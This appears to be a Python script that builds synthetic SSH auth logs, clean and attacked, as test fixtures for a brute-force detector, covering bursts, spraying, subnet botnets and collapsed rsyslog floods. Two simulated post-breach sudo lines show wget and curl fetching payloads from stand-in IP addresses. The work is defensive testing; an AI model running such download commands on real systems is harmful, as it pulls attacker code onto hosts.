# make_logs.py
# Builds the logs/ folder: a set of SSH authentication logs, some containing
# attacks and some deliberately clean.
#
#   python make_logs.py
#
# Every file is written from code rather than pasted by hand, so it can be
# regenerated, and so the expected result of each one is stated next to the
# thing that produces it.

import os
import random
from datetime import datetime, timedelta

from generate_log import LogBuilder, STAFF, INTERNAL, COMMON_TARGETS, build

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(BASE_DIR, "logs")

DAY = datetime(2026, 8, 24, 0, 0, 0)


def write(subdir, name, text, header):
    directory = os.path.join(LOGS_DIR, subdir)
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, name)
    with open(path, "w") as f:
        f.write(text)
    return path, header


def at(hour, minute=0, second=0):
    return DAY + timedelta(hours=hour, minutes=minute, seconds=second)


# ════════════════════════════════════════════════════════════════
#  CLEAN — these must produce ZERO findings
# ════════════════════════════════════════════════════════════════

def clean_quiet_night(rng):
    """Six hours of almost nothing. The simplest possible negative case."""
    b = LogBuilder(rng)
    when = at(1)
    for user in ("backup", "ansible", "backup"):
        b.success(when, user, rng.choice(INTERNAL))
        b.sshd(when + timedelta(seconds=1),
               f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")
        b.sshd(when + timedelta(minutes=4),
               f"pam_unix(sshd:session): session closed for user {user}")
        when += timedelta(hours=1, minutes=17)
    return b.render()


def clean_busy_office(rng):
    """A working day: many people, many logins, and plenty of mistyped
    passwords. Every one of those is 'failure then success from the same IP',
    the exact shape of a breach. Firing on any of them would be wrong."""
    b = LogBuilder(rng)
    for i in range(40):
        when = at(8) + timedelta(seconds=rng.randint(0, 9 * 3600))
        user = rng.choice(STAFF)
        ip = rng.choice(INTERNAL)
        # One in three logins is preceded by a fumbled password.
        for _ in range(rng.choice([0, 0, 1, 1, 2])):
            b.failure(when, user, ip)
            when += timedelta(seconds=rng.randint(5, 40))
        b.success(when, user, ip)
        b.sshd(when + timedelta(seconds=1),
               f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")
        if rng.random() < 0.5:
            b.add(when + timedelta(seconds=rng.randint(10, 600)),
                  f"sudo:  {user} : TTY=pts/0 ; PWD=/home/{user} ; "
                  f"USER=root ; COMMAND=/usr/bin/systemctl status nginx")
    return b.render()


def clean_background_noise(rng):
    """Internet background radiation: one or two probes from each of many
    addresses, spread across many networks. Constant on any exposed host, and
    none of it is an attack. This is the file that punishes a low threshold.

    Sources are drawn from 198.18.0.0/15 (RFC 2544, reserved for benchmarking
    and never routed) rather than the RFC 5737 documentation ranges. Those give
    only three /24s between them, so 90 unrelated scanners would pile into
    three subnets and the subnet check would correctly flag a botnet that is
    not there. Real background noise arrives from thousands of networks, and
    198.18.0.0/15 is the only non-routable space large enough to model that."""
    b = LogBuilder(rng)
    for _ in range(90):
        # A different /24 almost every time, as on a real host.
        ip = "198.18.%d.%d" % (rng.randint(0, 255), rng.randint(1, 254))
        when = at(0) + timedelta(seconds=rng.randint(0, 24 * 3600))
        for i in range(rng.randint(1, 2)):
            b.failure(when + timedelta(seconds=i * rng.randint(3, 30)),
                      rng.choice(COMMON_TARGETS), ip)
        if rng.random() < 0.5:
            b.noise(when + timedelta(seconds=rng.randint(1, 60)))
    return b.render()


# ════════════════════════════════════════════════════════════════
#  ATTACKS — each isolates one technique
# ════════════════════════════════════════════════════════════════

def attack_classic_burst(rng):
    """Textbook brute force: one address, one account, fast. Any detector
    catches this. It is here as the control case."""
    b = LogBuilder(rng)
    b.success(at(9, 5), "deploy", INTERNAL[0])
    when = at(9, 14)
    for _ in range(24):
        b.failure(when, "root", "198.51.100.201")
        when += timedelta(seconds=rng.randint(1, 4))
    b.success(at(9, 40), "alice", INTERNAL[1])
    return b.render()


def attack_successful_breach(rng):
    """The one that matters. Four usernames tried, then a login succeeds,
    then sudo to root. Only twelve failures — a burst threshold of 20 sees
    nothing, while the box is now owned."""
    b = LogBuilder(rng)
    b.success(at(3, 2), "backup", INTERNAL[2])
    when = at(4, 11)
    for user in ("root", "oracle", "admin", "postgres"):
        for _ in range(3):
            b.failure(when, user, "203.0.113.44")
            when += timedelta(seconds=rng.randint(2, 9))
    b.success(when, "postgres", "203.0.113.44")
    b.sshd(when + timedelta(seconds=2),
           "pam_unix(sshd:session): session opened for user postgres by (uid=0)")
    b.add(when + timedelta(seconds=31),
          "sudo:  postgres : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash")
    b.add(when + timedelta(seconds=44),
          "sudo:  postgres : TTY=pts/1 ; PWD=/tmp ; USER=root ; "
          "COMMAND=/usr/bin/wget http://198.51.100.9/x.sh")
    return b.render()


def attack_low_and_slow(rng):
    """One guess every seven minutes for twelve hours. Never five inside any
    two-minute window, so the common default never sees it."""
    b = LogBuilder(rng)
    when = at(2)
    for _ in range(96):
        b.failure(when, "ubuntu", "192.0.2.77")
        when += timedelta(seconds=rng.randint(400, 460))
    return b.render()


def attack_botnet_subnet(rng):
    """Eighteen addresses in one /24, three attempts each. No single address
    crosses any sane threshold. Only the subnet pivot sees it."""
    b = LogBuilder(rng)
    when = at(11, 30)
    for host in range(20, 38):
        for _ in range(3):
            b.failure(when, "test", f"192.0.2.{host}")
            when += timedelta(seconds=rng.randint(1, 6))
    return b.render()


def attack_password_spray(rng):
    """One password against fourteen accounts. Per-account counting sees one
    failure each and shrugs."""
    b = LogBuilder(rng)
    when = at(16, 20)
    for user in COMMON_TARGETS:
        b.failure(when, user, "203.0.113.150")
        when += timedelta(seconds=rng.randint(4, 14))
    return b.render()


def attack_rsyslog_collapsed(rng):
    """rsyslog folded a 60-attempt flood into a single summary line. A parser
    that reads it literally counts one failure and misses the attack."""
    b = LogBuilder(rng)
    b.sshd(at(3, 14), "Connection closed by 198.51.100.77 port 40001 [preauth]")
    b.failure(at(3, 15), "admin", "198.51.100.77")
    b.collapsed(at(3, 15, 2), "admin", "198.51.100.77", 60)
    b.sshd(at(3, 16), "Received disconnect from 198.51.100.77 port 40002:11: Bye")
    return b.render()


def attack_everything(rng):
    """All of the above, buried in a realistic day of ordinary traffic.
    This is the one that actually resembles a production log."""
    text, _ = build(hours=24, seed=20260824)
    return text


# ════════════════════════════════════════════════════════════════

CLEAN = [
    ("quiet-night.log", clean_quiet_night,
     "Six hours of routine automation. Nothing to find."),
    ("background-noise.log", clean_background_noise,
     "Internet background scanning: one or two probes from ~90 addresses in "
     "as many networks. Constant on any exposed host, and not an attack."),
]

# Clean traffic that a naive configuration flags anyway. These are the honest
# cases: the detector is behaving exactly as designed and is still wrong,
# because it has no way to know which network belongs to you.
TRICKY = [
    ("busy-office.log", clean_busy_office,
     "A full working day of legitimate logins, many preceded by a mistyped "
     "password. Individually harmless — but every member of staff is on the "
     "same /24, so their typos aggregate into one subnet finding. Add "
     "10.0.0.0/8 to the allowlist and it goes silent. This is what the "
     "allowlist is for."),
]

ATTACKS = [
    ("01-classic-burst.log", attack_classic_burst,
     "One address hammering root. The control case."),
    ("02-successful-breach.log", attack_successful_breach,
     "Username enumeration that SUCCEEDS, then sudo to root. The finding "
     "that actually matters."),
    ("03-low-and-slow.log", attack_low_and_slow,
     "One guess every ~7 minutes for 12 hours. Defeats a short window."),
    ("04-botnet-subnet.log", attack_botnet_subnet,
     "18 addresses in one /24, 3 attempts each. Only the subnet pivot sees it."),
    ("05-password-spray.log", attack_password_spray,
     "One password against 14 accounts from a single source."),
    ("06-rsyslog-collapsed.log", attack_rsyslog_collapsed,
     "A 60-attempt flood folded by rsyslog into one line."),
    ("07-everything.log", attack_everything,
     "A realistic 24h log with all of the above buried inside it."),
]


# ════════════════════════════════════════════════════════════════
#  The two try-me files, written to the project root so they are the
#  first thing anybody sees.
# ════════════════════════════════════════════════════════════════

def example_with_attacks(rng):
    """A day on an internet-facing host that IS being attacked.

    Five techniques, buried in ordinary traffic and background scanning so the
    detector has to find them rather than be handed them. Deliberately spread
    across separate /24s: an attack whose subnet already has a single loud
    address in it gets deduplicated, which would hide the botnet.
    """
    b = LogBuilder(rng)

    # Ordinary staff traffic, including normal mistyped passwords.
    for _ in range(26):
        when = at(6) + timedelta(seconds=rng.randint(0, 14 * 3600))
        user, ip = rng.choice(STAFF), rng.choice(INTERNAL)
        if rng.random() < 0.3:
            b.failure(when, user, ip)
            when += timedelta(seconds=rng.randint(6, 30))
        b.success(when, user, ip)
        b.sshd(when + timedelta(seconds=1),
               f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")
        if rng.random() < 0.4:
            b.add(when + timedelta(seconds=rng.randint(20, 400)),
                  f"sudo:  {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; "
                  f"COMMAND=/usr/bin/systemctl status nginx")

    # Background scanning. Harmless, and must not alert.
    for _ in range(40):
        ip = "198.18.%d.%d" % (rng.randint(0, 255), rng.randint(1, 254))
        when = at(0) + timedelta(seconds=rng.randint(0, 24 * 3600))
        for i in range(rng.randint(1, 2)):
            b.failure(when + timedelta(seconds=i * 12),
                      rng.choice(COMMON_TARGETS), ip)
        if rng.random() < 0.5:
            b.noise(when + timedelta(seconds=rng.randint(1, 90)))

    # 1. Classic fast burst.
    when = at(2, 41)
    for _ in range(22):
        b.failure(when, "root", "203.0.113.88")
        when += timedelta(seconds=rng.randint(1, 4))

    # 2. THE BREACH: enumeration that succeeds, then sudo and a download.
    when = at(4, 17)
    for user in ("root", "oracle", "admin", "jenkins"):
        for _ in range(3):
            b.failure(when, user, "198.51.100.23")
            when += timedelta(seconds=rng.randint(2, 8))
    b.success(when, "ansible", "198.51.100.23")
    b.sshd(when + timedelta(seconds=2),
           "pam_unix(sshd:session): session opened for user ansible by (uid=0)")
    b.add(when + timedelta(seconds=26),
          "sudo:  ansible : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash")
    b.add(when + timedelta(seconds=48),
          "sudo:  ansible : TTY=pts/2 ; PWD=/tmp ; USER=root ; "
          "COMMAND=/usr/bin/curl -o /tmp/m http://198.51.100.23/m")

    # 3. Botnet across one /24, three attempts per address. Nothing else in
    #    192.0.2.0/24, so the subnet finding is not deduplicated away.
    when = at(9, 12)
    for host in range(40, 58):
        for _ in range(3):
            b.failure(when, "test", f"192.0.2.{host}")
            when += timedelta(seconds=rng.randint(1, 5))

    # 4. Password spray: one guess against each account.
    when = at(13, 30)
    for user in COMMON_TARGETS:
        b.failure(when, user, "203.0.113.171")
        when += timedelta(seconds=rng.randint(5, 15))

    # 5. A 45-attempt flood that rsyslog folded into a single line.
    b.failure(at(20, 3), "admin", "198.51.100.240")
    b.collapsed(at(20, 3, 3), "admin", "198.51.100.240", 45)

    return b.render()


def example_without_attacks(rng):
    """The same kind of host on a day when nothing is happening.

    Real logins, real mistyped passwords, real background scanning, real cron
    and sudo noise. Must produce nothing. Staying quiet on this is harder than
    catching the attacks, and matters more.
    """
    b = LogBuilder(rng)

    for _ in range(34):
        when = at(7) + timedelta(seconds=rng.randint(0, 12 * 3600))
        user, ip = rng.choice(STAFF), rng.choice(INTERNAL)
        if rng.random() < 0.35:
            b.failure(when, user, ip)
            when += timedelta(seconds=rng.randint(8, 45))
        b.success(when, user, ip)
        b.sshd(when + timedelta(seconds=1),
               f"pam_unix(sshd:session): session opened for user {user} by (uid=0)")
        b.sshd(when + timedelta(minutes=rng.randint(3, 40)),
               f"pam_unix(sshd:session): session closed for user {user}")
        if rng.random() < 0.45:
            b.add(when + timedelta(seconds=rng.randint(15, 500)),
                  f"sudo:  {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; "
                  f"COMMAND=/usr/bin/apt update")

    for _ in range(48):
        ip = "198.18.%d.%d" % (rng.randint(0, 255), rng.randint(1, 254))
        when = at(0) + timedelta(seconds=rng.randint(0, 24 * 3600))
        for i in range(rng.randint(1, 2)):
            b.failure(when + timedelta(seconds=i * 15),
                      rng.choice(COMMON_TARGETS), ip)
        b.noise(when + timedelta(seconds=rng.randint(1, 120)))

    for _ in range(14):
        b.add(at(0) + timedelta(seconds=rng.randint(0, 24 * 3600)),
              f"CRON[{rng.randint(1000, 9999)}]: pam_unix(cron:session): "
              f"session opened for user root by (uid=0)")

    return b.render()


EXAMPLES = [
    ("EXAMPLE-1-attacks-present.log", example_with_attacks,
     "A day under attack: burst, breach, botnet, spray and a folded flood."),
    ("EXAMPLE-2-no-attacks.log", example_without_attacks,
     "The same host on a quiet day. Must produce nothing."),
]


def main():
    written = []
    for name, fn, description in EXAMPLES:
        rng = random.Random(sum(ord(c) for c in name) * 7919)
        path = os.path.join(BASE_DIR, name)
        with open(path, "w") as f:
            f.write(fn(rng))
        written.append((path, description))

    for folder, group in (("clean", CLEAN), ("tricky", TRICKY),
                          ("attacks", ATTACKS)):
        for name, fn, description in group:
            # Seeded from the name, so regenerating gives the same file.
            rng = random.Random(sum(ord(c) for c in name) * 7919)
            written.append(write(folder, name, fn(rng), description))

    print(f"Wrote {len(written)} log files under {LOGS_DIR}/\n")
    for path, description in written:
        rel = os.path.relpath(path, BASE_DIR)
        lines = sum(1 for _ in open(path))
        print(f"  {rel:<40} {lines:>5} lines")
    return written


if __name__ == "__main__":
    main()
